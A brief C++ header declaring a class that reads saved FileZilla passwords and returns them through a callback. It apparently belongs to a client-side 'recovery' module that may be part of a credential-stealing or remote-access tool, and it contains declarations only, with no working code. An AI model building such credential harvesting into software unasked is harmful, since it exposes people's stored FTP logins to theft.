#pragma once
#include <vector>
#include <functional>
#include "RecoveredPassword.h"

namespace rslm {
    namespace client {
        namespace recovery {

            using models::RecoveredPassword;
            using PasswordCallback = std::function<void(const std::vector<RecoveredPassword>&)>;

            class FileZillaPassReader {
            public:
                static void ReadPasswords(PasswordCallback callback);
                static std::string GetConfigPath();
            };

        } // namespace recovery
    } // namespace client
} // namespace rslm